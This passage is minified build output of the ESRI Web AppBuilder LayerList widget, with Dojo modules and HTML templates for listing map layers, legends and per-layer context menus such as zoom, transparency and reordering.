// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/LayerList/LayerListView":function(){define("dijit/_WidgetBase dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/dom-construct dojo/on dojo/query jimu/dijit/CheckBox jimu/dijit/DropMenu ./PopupMenu dijit/_TemplatedMixin dojo/text!./LayerListView.html dojo/dom-class dojo/dom-style ./NlsStrings".split(" "),function(t,q,e,g,h,n,l,p,u,r,v,a,c,m,f){return q([t,v],{templateString:a,_currentSelectedLayerRowNode:null,operationsDropMenu:null,_layerNodeHandles:null,_layerDomNodeStorage:null,
postMixInProperties:function(){this.inherited(arguments);this.nls=f.value;this._layerDomNodeStorage={}},postCreate:function(){this.refresh();this._initOperations()},refresh:function(){this._removeLayerNodes();g.forEach(this.operLayerInfos.getLayerInfoArray(),function(b){this.drawListNode(b,0,this.layerListTable)},this);g.forEach(this.operLayerInfos.getTableInfoArray(),function(b){this.drawListNode(b,0,this.tableListTable)},this)},drawListNode:function(b,d,k,a){var f;this.isLayerHiddenInWidget(b)||
(f=this._layerDomNodeStorage[b.getObjectId()],(b.isRootLayer()||b.isTable)&&f?(h.place(f.layerTrNode,k,a),h.place(f.layerContentTrNode,k,a)):0===b.newSubLayers.length?(f=this.addLayerNode(b,d,k,a),this.config.showLegend?this.addLegendNode(b,d,f.subNode):(b=l(".showLegend-div",f.layerTrNode)[0])&&c.add(b,"hidden")):(f=this.addLayerNode(b,d,k,a),g.forEach(b.newSubLayers,e.hitch(this,function(b,d){this.drawListNode(d,b+1,f.subNode)},d))))},addLayerNode:function(b,d,k,a){var c,f,w,g,u,l,r=b.getRootLayerInfo();
if(b.isRootLayer()||b.isTable)this._layerDomNodeStorage[b.getObjectId()]={layerTrNode:null,layerContentTrNode:null,layerNodeEventHandles:[],layerNodeReferredDijits:[]};c=h.create("tr",{"class":"jimu-widget-row layer-row  layer-tr-node-"+b.id,layerTrNodeId:b.id});h.place(c,k,a);f=h.create("td",{"class":"col col1"},c);for(g=0;g<d;g++)h.create("div",{"class":"begin-blank-div jimu-float-leading",innerHTML:""},f);l=h.create("div",{"class":"showLegend-div jimu-float-leading",imageShowLegendDivId:b.id},
f);w=h.create("div",{"class":"div-select jimu-float-leading"},f);g=new p({checked:b.isVisible(),"class":"visible-checkbox-"+b.id});h.place(g.domNode,w);u=h.create("div",{"class":"noLegend-div jimu-float-leading"},f);h.create("img",{"class":"noLegend-image",src:this.layerListWidget.folderUrl+(b.isTable?"images/table.png":"images/noLegend.png"),alt:"l"},u);if(b.isTiled||b.isTable)m.set(l,"display","none"),m.set(w,"display","none"),m.set(u,"display","block");m.set(f,"width",12*d+40+"px");d=h.create("td",
{"class":"col col2"},c);f="";try{b.isInScale()||(f="grayed-title")}catch(y){console.warn(y.message)}h.create("div",{innerHTML:b.title,"class":"layer-title-div-"+b.id+" div-content jimu-float-leading "+f},d);f=h.create("td",{"class":"col col3"},c);w=this.hasContentMenu()?"display: block":"display: none";f=h.create("div",{"class":"layers-list-popupMenu-div",style:w},f);w=h.create("tr",{"class":"",layerContentTrNodeId:b.id});h.place(w,k,a);k=h.create("td",{"class":"",colspan:"3"},w);k=h.create("table",
{"class":"layer-sub-node",subNodeId:b.id},k);a=this.own(n(d,"click",e.hitch(this,this._onRowTrClick,b,l,c,k)));this._storeLayerNodeEventHandle(r,a[0]);a=this.own(n(l,"click",e.hitch(this,this._onRowTrClick,b,l,c,k)));this._storeLayerNodeEventHandle(r,a[0]);a=this.own(n(g.domNode,"click",e.hitch(this,this._onCkSelectNodeClick,b,g)));this._storeLayerNodeEventHandle(r,a[0]);a=this.own(n(f,"click",e.hitch(this,this._onPopupMenuClick,b,f,c)));this._storeLayerNodeEventHandle(r,a[0]);if(b.isRootLayer()||
b.isTable)this._layerDomNodeStorage[b.getObjectId()].layerTrNode=c,this._layerDomNodeStorage[b.getObjectId()].layerContentTrNode=w;return{layerTrNode:c,subNode:k}},hasContentMenu:function(){var b=!1,d;if(this.config.contextMenu)for(d in this.config.contextMenu)this.config.contextMenu.hasOwnProperty(d)&&"function"!==typeof this.config.contextMenu[d]&&(b=b||this.config.contextMenu[d]);else b=!0;return b},addLegendNode:function(b,d,k){k=h.create("tr",{"class":"legend-node-tr"},k);k=h.create("td",{"class":"legend-node-td"},
k);try{var a=b.createLegendsNode();m.set(a,"font-size",12*(d+1)+"px");h.place(a,k)}catch(x){console.error(x)}},redrawLegends:function(b){var d=l("div[legendsDivId\x3d'"+b.id+"']",this.layerListTable)[0];d&&(d._legendDijit&&d._legendDijit.destroy&&d._legendDijit.destroy(),b.drawLegends(d,this.layerListWidget.appConfig.portalUrl))},_storeLayerNodeEventHandle:function(b,d){(b=this._layerDomNodeStorage[b.getObjectId()])&&b.layerNodeEventHandles.push(d)},_storeLayerNodeDijit:function(b,d){(b=this._layerDomNodeStorage[b.getObjectId()])&&
b.layerNodeReferredDijits.push(d)},_clearLayerDomNodeStorage:function(){var b=this.operLayerInfos.getLayerInfoArray(),d=this.operLayerInfos.getTableInfoArray(),b=b.concat(d),a;for(a in this._layerDomNodeStorage)this._layerDomNodeStorage.hasOwnProperty(a)&&"function"!==typeof this._layerDomNodeStorage[a]&&(d=g.some(b,function(b){if(b.getObjectId().toString()===a)return!0},this),d||(g.forEach(this._layerDomNodeStorage[a].layerNodeEventHandles,function(b){b.remove()},this),g.forEach(this._layerDomNodeStorage[a].layerNodeReferredDijits,
function(b){b.destroy()},this),h.destroy(this._layerDomNodeStorage[a].layerTrNode),h.destroy(this._layerDomNodeStorage[a].layerContentTrNode),delete this._layerDomNodeStorage[a]))},_removeLayerNodes:function(){var b,d;this._clearLayerDomNodeStorage();for(var a in this._layerDomNodeStorage)this._layerDomNodeStorage.hasOwnProperty(a)&&"function"!==typeof this._layerDomNodeStorage[a]&&(b=this._layerDomNodeStorage[a],b.parentNode&&b.layerTrNode&&((d=b.layerTrNode.parentNode)&&d.removeChild(b.layerTrNode),
(d=b.layerContentTrNode.parentNode)&&d.removeChild(b.layerContentTrNode)))},_foldSwitch:function(b,d,a){return"none"===m.get(a,"display")?this._foldOrUnfoldLayer(b,!1,d,a):this._foldOrUnfoldLayer(b,!0,d,a)},_foldOrUnfoldLayer:function(b,d,a,f){var k=k?a:l("div[imageShowLegendDivId\x3d'"+b.id+"']",this.layerListTable)[0],e=e?f:l("table[subNodeId\x3d'"+b.id+"']",this.layerListTable)[0];a=null;k&&e&&(d?(m.set(e,"display","none"),c.remove(k,"unfold"),a=!0):(m.set(e,"display","table"),c.add(k,"unfold"),
a=!1,b.isLeaf()&&(d=l(".legends-div",e)[0],k=l(".legends-loading-img",d)[0],d&&k&&b.drawLegends(d,this.layerListWidget.appConfig.portalUrl))));return a},_foldOrUnfoldLayers:function(b,d){g.forEach(b,function(b){this._foldOrUnfoldLayer(b,d)},this)},_onCkSelectNodeClick:function(b,d,a){a.ctrlKey||a.metaKey?b.isRootLayer()?this.turnAllRootLayers(d.checked):this.turnAllSameLevelLayers(b,d.checked):(this.layerListWidget._denyLayerInfosIsVisibleChangedResponseOneTime=!0,b.setTopLayerVisible(d.checked));
a.stopPropagation()},_onPopupMenuClick:function(b,d,a,c){var f=b.getRootLayerInfo(),k=d.popupMenu;k||(k=(new r({_layerInfo:b,box:this.layerListWidget.domNode.parentNode,popupMenuNode:d,layerListWidget:this.layerListWidget,_config:this.config})).placeAt(d),d.popupMenu=k,this._storeLayerNodeDijit(f,k),b=this.own(n(k,"onMenuClick",e.hitch(this,this._onPopupMenuItemClick,b,k))),this._storeLayerNodeEventHandle(f,b[0]));this._changeSelectedLayerRow(a);k&&"opened"===k.state?k.closeDropMenu():(this._hideCurrentPopupMenu(),
k&&(this.currentPopupMenu=k,k.openDropMenu()));this.operationsDropMenu&&"opened"===this.operationsDropMenu.state&&this.operationsDropMenu.closeDropMenu();c.stopPropagation()},_hideCurrentPopupMenu:function(){this.currentPopupMenu&&"opened"===this.currentPopupMenu.state&&this.currentPopupMenu.closeDropMenu()},_onLayerListWidgetPaneClick:function(){this.operationsDropMenu&&this.operationsDropMenu.closeDropMenu()},_onRowTrClick:function(b,d,a,c,f){this._changeSelectedLayerRow(a);d=this._foldSwitch(b,
d,c);if(f.ctrlKey||f.metaKey)b.isRootLayer()?this.foldOrUnfoldAllRootLayers(d):this.foldOrUnfoldSameLevelLayers(b,d)},_changeSelectedLayerRow:function(b){this._currentSelectedLayerRowNode&&this._currentSelectedLayerRowNode===b||(this._currentSelectedLayerRowNode&&c.remove(this._currentSelectedLayerRowNode,"jimu-widget-row-selected"),c.add(b,"jimu-widget-row-selected"),this._currentSelectedLayerRowNode=b)},_onPopupMenuItemClick:function(b,d,a,c){c={itemKey:a.key,extraData:c,layerListWidget:this.layerListWidget,
layerListView:this};"transparency"===a.key?"none"===m.get(d.transparencyDiv,"display")?d.showTransNode(b.getOpacity()):d.hideTransNode():(b=d.popupMenuInfo.onPopupMenuClick(c),b.closeMenu&&d.closeDropMenu())},_exchangeLayerTrNode:function(b,d){b=l("tr[layerTrNodeId\x3d'"+b.id+"']",this.layerListTable)[0];var a=l("tr[layerTrNodeId\x3d'"+d.id+"']",this.layerListTable)[0];d=l("tr[layerContentTrNodeId\x3d'"+d.id+"']",this.layerListTable)[0];b&&a&&d&&(this.layerListTable.removeChild(a),this.layerListTable.insertBefore(a,
b),this.layerListTable.removeChild(d),this.layerListTable.insertBefore(d,b))},_getMovedSteps:function(b,d){var a=1,c,f=this.operLayerInfos.getLayerInfoArray();g.forEach(f,function(a,d){b.id===a.id&&(c=d)},this);if("moveup"===d)for(;!f[c].isFirst;)if(c--,this.isLayerHiddenInWidget(f[c])&&!f[c].isFirst)a++;else break;else for(;!f[c].isLast;)if(c++,this.isLayerHiddenInWidget(f[c])&&!f[c].isLast)a++;else break;return a},moveUpLayer:function(b){var a=this._getMovedSteps(b,"moveup");this.layerListWidget._denyLayerInfosReorderResponseOneTime=
!0;(a=this.operLayerInfos.moveUpLayer(b,a))&&this._exchangeLayerTrNode(a,b)},moveDownLayer:function(b){var a=this._getMovedSteps(b,"movedown");this.layerListWidget._denyLayerInfosReorderResponseOneTime=!0;(a=this.operLayerInfos.moveDownLayer(b,a))&&this._exchangeLayerTrNode(b,a)},isLayerHiddenInWidget:function(b){var a=!1,c=b;if(b&&this.config.layerOptions&&void 0!==this.config.layerOptions[b.id])for(;c&&!(a=a||!this.config.layerOptions[c.id].display);)c=c.parentLayerInfo;else a=!1;return a},isFirstDisplayedLayerInfo:function(b){var a,
c;b.isFirst||!b.isRootLayer()?a=!0:(a=this._getMovedSteps(b,"moveup"),c=this.operLayerInfos.getLayerInfoArray(),b=this.operLayerInfos._getTopLayerInfoIndexById(b.id),a=this.isLayerHiddenInWidget(c[b-a])?!0:!1);return a},isLastDisplayedLayerInfo:function(b){var a,c;b.isLast||!b.isRootLayer()?a=!0:(a=this._getMovedSteps(b,"movedown"),c=this.operLayerInfos.getLayerInfoArray(),b=this.operLayerInfos._getTopLayerInfoIndexById(b.id),a=this.isLayerHiddenInWidget(c[b+a])?!0:!1);return a},_initOperations:function(){this.operationsDropMenu=
(new u({items:[{key:"turnAllLayersOn",label:this.nls.turnAllLayersOn},{key:"turnAllLayersOff",label:this.nls.turnAllLayersOff},{key:"separator"},{key:"expandAllLayers",label:this.nls.expandAllLayers},{key:"collapseAlllayers",label:this.nls.collapseAlllayers}],box:this.layerListWidget.domNode.parentNode})).placeAt(this.layerListOperations);var b=l("div.jimu-dropmenu \x3e div:first-child",this.layerListOperations)[0];b&&(c.remove(b,["jimu-icon-btn","popup-menu-button"]),c.add(b,["feature-action","icon-operation"]));
this.operationsDropMenu.btnNode&&this.own(n(this.operationsDropMenu.btnNode,"click",e.hitch(this,this._onLayerListOperationsClick)));this.own(n(this.operationsDropMenu,"onMenuClick",e.hitch(this,this._onOperationsMenuItemClick)))},_onLayerListOperationsClick:function(){this._hideCurrentPopupMenu()},_onOperationsMenuItemClick:function(b){switch(b.key){case "turnAllLayersOn":this.turnAllRootLayers(!0);break;case "turnAllLayersOff":this.turnAllRootLayers(!1);break;case "expandAllLayers":this.foldOrUnfoldAllRootLayers(!1);
break;case "collapseAlllayers":this.foldOrUnfoldAllRootLayers(!0)}},turnAllRootLayers:function(b){var a=this.operLayerInfos.getLayerInfoArray();g.forEach(a,function(a){this.isLayerHiddenInWidget(a)||a.setTopLayerVisible(b)},this)},turnAllSameLevelLayers:function(b,a){var c={},d=b.getRootLayerInfo();d.traversal(e.hitch(this,function(d){d.parentLayerInfo&&d.parentLayerInfo.id===b.parentLayerInfo.id&&!this.isLayerHiddenInWidget(d)?c[d.id]={visible:a}:c[d.id]={visible:d.isVisible()}}));d.resetLayerObjectVisibility(c)},
foldOrUnfoldAllRootLayers:function(b){var a=g.filter(this.operLayerInfos.getLayerInfoArray(),function(b){return!this.isLayerHiddenInWidget(b)},this);this._foldOrUnfoldLayers(a,b)},foldOrUnfoldSameLevelLayers:function(b,a){b.parentLayerInfo&&(b=g.filter(b.parentLayerInfo.getSubLayers(),function(b){return!this.isLayerHiddenInWidget(b)},this),this._foldOrUnfoldLayers(b,a))}})})},"jimu/dijit/DropMenu":function(){define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/Evented ../utils".split(" "),
function(t,q,e,g,h,n,l,p){return t([q,l],{baseClass:"jimu-dropmenu",declaredClass:"jimu.dijit.DropMenu",constructor:function(){this.state="closed"},postCreate:function(){this.btnNode=h.create("div",{"class":"popup-menu-button"},this.domNode);this.own(n(this.btnNode,"click",e.hitch(this,this._onBtnClick)));this.box||(this.box=this.domNode.parentNode);this.own(n(this.box,"click",e.hitch(this,function(){this.dropMenuNode&&this.closeDropMenu()})))},_onBtnClick:function(e){e.stopPropagation();this.dropMenuNode||
this._createDropMenuNode();"closed"===this.state?this.openDropMenu():this.closeDropMenu()},_createDropMenuNode:function(){this.dropMenuNode=h.create("div",{"class":"drop-menu",style:{display:"none"}},this.domNode);this.items||(this.items=[]);g.forEach(this.items,function(g){var l;g.key&&"separator"===g.key?h.create("hr",{"class":"menu-item-identification menu-item-line",itemId:g.key},this.dropMenuNode):g.key&&(l=h.create("div",{"class":"menu-item-identification menu-item",itemId:g.key,innerHTML:g.label},
this.dropMenuNode),this.own(n(l,"click",e.hitch(this,function(e){this.selectItem(g,e)}))))},this)},_getDropMenuPosition:function(){var e=h.getContentBox(this.box),g=h.getMarginBox(this.domNode),l=h.getMarginBox(this.btnNode),a=h.getMarginBox(this.dropMenuNode),c={},m,f;c.l=g.l;c.t=g.t+l.h;c.t+a.h>e.h&&(f=g.t,m=e.h-g.t-l.h,m=Math.max(f,m),m===f&&(c.t=0-a.h));c.l+a.w>e.w&&(a=g.l,e=e.w-g.l-l.w,m=Math.max(a,e),m===a&&(c.l="",c.r=0));c.left=c.l;c.top=c.t;c.right=c.r;return c},selectItem:function(e){this.closeDropMenu();
this.emit("onMenuClick",e)},openDropMenu:function(){this.state="opened";h.setStyle(this.dropMenuNode,"display","");h.setStyle(this.dropMenuNode,p.getPositionStyle(this._getDropMenuPosition()));this.emit("onOpenMenu")},closeDropMenu:function(){this.state="closed";h.setStyle(this.dropMenuNode,"display","none");this.emit("onCloseMenu")}})})},"widgets/LayerList/PopupMenu":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/html dojo/_base/lang dojo/query dojo/Deferred jimu/dijit/DropMenu dijit/_TemplatedMixin dijit/form/HorizontalSlider dijit/form/HorizontalRuleLabels dojo/text!./PopupMenu.html dojo/dom-style ./NlsStrings ./PopupMenuInfo".split(" "),
function(t,q,e,g,h,n,l,p,u,r,v,a,c,m){return t([l,p],{templateString:v,popupMenuInfo:null,loading:null,_deniedItems:null,_deniedItemsFromConfig:null,_layerInfo:null,constructor:function(){this.nls=c.value},postCreate:function(){this.inherited(arguments);this._initDeniedItems();this.loading=e.create("div",{"class":"popup-menu-loading"},this.popupMenuNode)},_initDeniedItems:function(){var a=[],b={ZoomTo:"zoomto",Transparency:"transparency",EnableOrDisablePopup:"controlPopup",MoveupOrMovedown:"moveup movedown",
OpenAttributeTable:"table",DescriptionOrShowItemDetailsOrDownload:"url"};this._deniedItems=[];this._deniedItemsFromConfig=[];for(var c in this._config.contextMenu)this._config.contextMenu.hasOwnProperty(c)&&"function"!==typeof this._config.contextMenu[c]&&!1===this._config.contextMenu[c]&&(a=a.concat(b[c].split(" ")));q.forEach(a,g.hitch(this,function(b){this._deniedItemsFromConfig.push({key:b,denyType:"hidden"})}))},_getDropMenuPosition:function(){return{top:"40px",right:"0px",zIndex:1}},_getTransNodePosition:function(){return{top:"28px",
right:"2px"}},_onBtnClick:function(){},_refresh:function(){this._denyItems();this._changeItemsUI()},_denyItems:function(){var a=h("[class~\x3d'menu-item-identification']",this.dropMenuNode);a.forEach(function(b){e.removeClass(b,"menu-item-dissable");e.removeClass(b,"menu-item-hidden")},this);e.removeClass(this.dropMenuNode,"no-border");q.forEach(this._deniedItems,function(b){var a=h("div[itemId\x3d'"+b.key+"']",this.dropMenuNode)[0];a&&("disable"===b.denyType?(e.addClass(a,"menu-item-dissable"),"url"===
b.key&&h(".menu-item-description",a).forEach(function(b){e.setAttr(b,"href","#");e.removeAttr(b,"target")})):e.addClass(a,"menu-item-hidden"))},this);for(var b=-1,c=0;c<a.length;c++)e.hasClass(a[c],"menu-item-line")&&(-1===b||e.hasClass(a[b],"menu-item-line"))&&e.addClass(a[c],"menu-item-hidden"),e.hasClass(a[c],"menu-item-hidden")||(b=c);a=q.filter(a,function(b){return!e.hasClass(b,"menu-item-hidden")});0===a.length?e.addClass(this.dropMenuNode,"no-border"):(e.removeClass(this.dropMenuNode,"no-border"),
e.hasClass(a[a.length-1],"menu-item-line")&&e.addClass(a[a.length-1],"menu-item-hidden"))},_changeItemsUI:function(){var a=h("[itemid\x3dcontrolPopup]",this.dropMenuNode)[0];a&&this._layerInfo.controlPopupInfo&&(this._layerInfo.controlPopupInfo.enablePopup?e.setAttr(a,"innerHTML",this.nls.removePopup):e.setAttr(a,"innerHTML",this.nls.enablePopup));(a=h("[itemid\x3dcontrolLabels]",this.dropMenuNode)[0])&&this._layerInfo.canShowLabel()&&(this._layerInfo.isShowLabels()?e.setAttr(a,"innerHTML",this.nls.hideLables):
e.setAttr(a,"innerHTML",this.nls.showLabels))},_switchLoadingState:function(a){a?e.setStyle(this.loading,"display","block"):e.setStyle(this.loading,"display","none")},selectItem:function(a,b){for(var c=!1,f=0;f<this._deniedItems.length;f++)if(this._deniedItems[f].key===a.key){c=!0;break}c||this.emit("onMenuClick",a);b.stopPropagation(b)},openDropMenu:function(){var a=g.hitch(this,this.inherited,arguments),b=new n;this._switchLoadingState(!0);this.dropMenuNode?b.resolve(this.popupMenuInfo):m.create(this._layerInfo,
this.layerListWidget).then(g.hitch(this,function(a){this.items=a.getDisplayItems();this.popupMenuInfo=a;this._createDropMenuNode();b.resolve(this.popupMenuInfo)}));b.then(g.hitch(this,function(){this.popupMenuInfo.getDeniedItems().then(g.hitch(this,function(b){this._deniedItems=this._deniedItemsFromConfig.concat(b);this._refresh();a(arguments);this._switchLoadingState(!1)}),g.hitch(this,function(){this._switchLoadingState(!1)}))}),g.hitch(this,function(){this._switchLoadingState(!1)}))},closeDropMenu:function(){this.inherited(arguments);
this.hideTransNode()},_onTransparencyDivClick:function(a){a.stopPropagation()},showTransNode:function(c){this.transHorizSlider||(this._createTransparencyWidget(),this.transHorizSlider.set("value",1-c));a.set(this.transparencyDiv,"top",this._getTransNodePosition().top);isRTL?a.set(this.transparencyDiv,"left",this._getTransNodePosition().right):a.set(this.transparencyDiv,"right",this._getTransNodePosition().right);a.set(this.transparencyDiv,"display","block")},hideTransNode:function(){a.set(this.transparencyDiv,
"display","none")},_createTransparencyWidget:function(){this.transHorizSlider=new u({minimum:0,maximum:1,intermediateChanges:!0},this.transparencyBody);this.own(this.transHorizSlider.on("change",g.hitch(this,function(a){this.emit("onMenuClick",{key:"transparencyChanged"},{newTransValue:a})})));new r({container:"bottomDecoration"},this.transparencyRule)},hide:function(){a.set(this.domNode,"display","none")},show:function(){a.set(this.domNode,"display","block")}})})},"widgets/LayerList/NlsStrings":function(){define([],
function(){return{value:null}})},"widgets/LayerList/PopupMenuInfo":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/Deferred dojo/promise/all jimu/WidgetManager jimu/portalUrlUtils esri/lang esri/graphicsUtils ./NlsStrings".split(" "),function(t,q,e,g,h,n,l,p,u,r){var v=t([],{_candidateMenuItems:null,_displayItems:null,_layerInfo:null,_layerType:null,_appConfig:null,constructor:function(a,c,e,f){this.nls=r.value;this._layerInfo=a;this._layerType=e;this.layerListWidget=f;
this._initCandidateMenuItems();this._initDisplayItems(c)},_getATagLabel:function(){var a,c;a=this._layerInfo.getUrl();(c=this._layerInfo.isItemLayer())?(a=this._getItemDetailsPageUrl(c)||a,c=this.nls.itemShowItemDetails):!a||"CSVLayer"!==this._layerType&&"KMLLayer"!==this._layerType?(a=a&&"WMSLayer"===this._layerType?a+(-1<a.indexOf("?")?"\x26":"?")+"SERVICE\x3dWMS\x26REQUEST\x3dGetCapabilities":a&&"WFSLayer"===this._layerType?a+(-1<a.indexOf("?")?"\x26":"?")+"SERVICE\x3dWFS\x26REQUEST\x3dGetCapabilities":
a?a:"",c=this.nls.itemDesc):c=this.nls.itemDownload;this._ATagLabelUrl=a;return'\x3ca class\x3d"menu-item-description" target\x3d"_blank" href\x3d"'+a+'"\x3e'+c+"\x3c/a\x3e"},_getItemDetailsPageUrl:function(a){var c="";return c=l.getItemDetailsPageUrl(a.portalUrl,a.itemId)},_initCandidateMenuItems:function(){this._candidateMenuItems=[{key:"separator",label:""},{key:"empty",label:this.nls.empty},{key:"zoomto",label:this.nls.itemZoomTo},{key:"transparency",label:this.nls.itemTransparency},{key:"moveup",
label:this.nls.itemMoveUp},{key:"movedown",label:this.nls.itemMoveDown},{key:"table",label:this.nls.itemToAttributeTable},{key:"controlPopup",label:this.nls.removePopup},{key:"controlLabels",label:this.nls.showLabels},{key:"url",label:this._getATagLabel()}]},_initDisplayItems:function(a){this._displayItems=[];q.forEach(a,function(a){q.forEach(this._candidateMenuItems,function(c){a.key===c.key&&(this._displayItems.push(e.clone(c)),a.onClick&&(this._displayItem.onClick=a.onClick))},this)},this)},_isSupportedByAT:function(){return!0},
_isSupportedByAT_bk:function(a,c){a=a.config;a=0===a.layerInfos.length?!0:q.some(a.layerInfos,function(a){if(a.id===this._layerInfo.id&&a.show)return!0},this);return c.isSupportedLayer&&c.isSupportQuery&&!c.otherReasonCanNotSupport&&a?!0:!1},getDeniedItems:function(){var a=new g,c=[];this.layerListWidget.layerListView.isFirstDisplayedLayerInfo(this._layerInfo)&&c.push({key:"moveup",denyType:"disable"});this.layerListWidget.layerListView.isLastDisplayedLayerInfo(this._layerInfo)&&c.push({key:"movedown",
denyType:"disable"});this._ATagLabelUrl||c.push({key:"url",denyType:"disable"});this._layerInfo.canShowLabel()||c.push({key:"controlLabels",denyType:"hidden"});var m=this._layerInfo.loadInfoTemplate(),f=this._layerInfo.getSupportTableInfo();h({infoTemplate:m,supportTableInfo:f}).then(e.hitch(this,function(b){b.infoTemplate||c.push({key:"controlPopup",denyType:"disable"});b=b.supportTableInfo;var d=this.layerListWidget.appConfig.getConfigElementsByName("AttributeTable")[0];d&&d.visible?this._isSupportedByAT(d,
b)||(this._layerInfo.parentLayerInfo&&this._layerInfo.parentLayerInfo.isMapNotesLayerInfo()?c.push({key:"table",denyType:"hidden"}):c.push({key:"table",denyType:"disable"})):c.push({key:"table",denyType:"hidden"});a.resolve(c)}),function(){a.resolve(c)});return a},getDisplayItems:function(){return this._displayItems},onPopupMenuClick:function(a){var c={closeMenu:!0};switch(a.itemKey){case "zoomto":this._onItemZoomToClick(a);break;case "moveup":this._onMoveUpItemClick(a);break;case "movedown":this._onMoveDownItemClick(a);
break;case "table":this._onTableItemClick(a);break;case "transparencyChanged":this._onTransparencyChanged(a);c.closeMenu=!1;break;case "controlPopup":this._onControlPopup();break;case "controlLabels":this._onControlLabels()}return c},_onItemZoomToClick:function(a){this._layerInfo.getExtent().then(e.hitch(this,function(a){var c=null;a=a&&0<a.length&&a[0];this._isValidExtent(a)&&(c=a);c?this._layerInfo.map.setExtent(c):0<=this._layerInfo.map.graphicsLayerIds.indexOf(this._layerInfo.id)&&this._layerInfo.getLayerObject().then(e.hitch(this,
function(a){if(a.graphics&&0<a.graphics.length){try{c=u.graphicsExtent(a.graphics)}catch(b){console.error(b)}c&&this._layerInfo.map.setExtent(c)}}))}))},_isValidExtent:function(a){var c=!1;p.isDefined(a)&&p.isDefined(a.xmin)&&isFinite(a.xmin)&&p.isDefined(a.ymin)&&isFinite(a.ymin)&&p.isDefined(a.xmax)&&isFinite(a.xmax)&&p.isDefined(a.ymax)&&isFinite(a.ymax)&&(c=!0);return c},_onMoveUpItemClick:function(a){this._layerInfo.isFirst||a.layerListView.moveUpLayer(this._layerInfo)},_onMoveDownItemClick:function(a){this._layerInfo.isLast||
a.layerListView.moveDownLayer(this._layerInfo)},_onTableItemClick:function(a){this._layerInfo.getSupportTableInfo().then(e.hitch(this,function(c){var g=this.layerListWidget.appConfig.getConfigElementsByName("AttributeTable")[0];this._isSupportedByAT(g,c)&&(c=n.getInstance(),c.triggerWidgetOpen(g.id).then(e.hitch(this,function(){a.layerListWidget.publishData({target:"AttributeTable",layer:this._layerInfo})})))}))},_onTransparencyChanged:function(a){this._layerInfo.setOpacity(1-a.extraData.newTransValue)},
_onControlPopup:function(a){this._layerInfo.controlPopupInfo.enablePopup?this._layerInfo.disablePopup():this._layerInfo.enablePopup();this._layerInfo.map.infoWindow.hide()},_onControlLabels:function(a){this._layerInfo.canShowLabel()&&(this._layerInfo.isShowLabels()?this._layerInfo.hideLabels():this._layerInfo.showLabels())}});v.create=function(a,c){var m=new g,f=a.isRootLayer(),b={RootLayer:[{key:"zoomto"},{key:"transparency"},{key:"separator"},{key:"moveup"},{key:"movedown"},{key:"separator"},{key:"url"}],
RootLayerAndFeatureLayer:[{key:"zoomto"},{key:"transparency"},{key:"separator"},{key:"controlPopup"},{key:"separator"},{key:"controlLabels"},{key:"separator"},{key:"moveup"},{key:"movedown"},{key:"separator"},{key:"table"},{key:"separator"},{key:"url"}],FeatureLayer:[{key:"controlPopup"},{key:"separator"},{key:"table"},{key:"separator"},{key:"url"}],GroupLayer:[{key:"url"}],Table:[{key:"table"},{key:"separator"},{key:"url"}],"default":[{key:"url",onClick:null}]};a.getLayerType().then(e.hitch(this,
function(d){var e="",e=!f||"FeatureLayer"!==d&&"CSVLayer"!==d&&"ArcGISImageServiceLayer"!==d&&"StreamLayer"!==d&&"ArcGISImageServiceVectorLayer"!==d?f?"RootLayer":"FeatureLayer"===d||"CSVLayer"===d?"FeatureLayer":"GroupLayer"===d?"GroupLayer":"Table"===d?"Table":"default":"RootLayerAndFeatureLayer";m.resolve(new v(a,b[e],d,c))}),e.hitch(this,function(){m.resolve(new v(a,[{key:"empty"}]))}));return m};return v})},"widgets/LayerList/_build-generate_module":function(){define(["dojo/text!./Widget.html",
"dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/LayerList/PopupMenu.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"popup-menu-transparency-body" data-dojo-attach-point\x3d"transparencyDiv" data-dojo-attach-event\x3d"onclick:_onTransparencyDivClick" \x3e\r\n    \x3cdiv class\x3d"label"\x3e\r\n      \x3cdiv class\x3d"label-left jimu-float-leading"\x3e${nls.itemOpaque}\x3c/div\x3e\r\n      \x3cdiv class\x3d"label-right jimu-float-trailing"\x3e${nls.itemTransparent}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"transparencyBody"\x3e \r\n      \x3col data-dojo-attach-point\x3d"transparencyRule" class\x3d"transparency-rule"\x3e \x3c/ol\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3cdiv\x3e\r\n',
"url:widgets/LayerList/LayerListView.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"layer-list-operations" data-dojo-attach-point\x3d"layerListOperations"\x3e\r\n    \x3c!--div class\x3d"setting-image jimu-icon jimu-icon-setting jimu-state-disabled"\x3e\x3c/div--\x3e\r\n  \x3c/div\x3e\r\n  \x3ctable class\x3d"layer-list-table"\x3e\r\n    \x3ctbody class\x3d"layers-list-body" data-dojo-attach-point\x3d"layerListTable"\x3e\x3c/tbody\x3e\r\n    \x3ctbody class\x3d"layers-list-body" data-dojo-attach-point\x3d"tableListTable"\x3e\x3c/tbody\x3e       \r\n  \x3c/table\x3e\r\n\x3c/div\x3e\r\n',
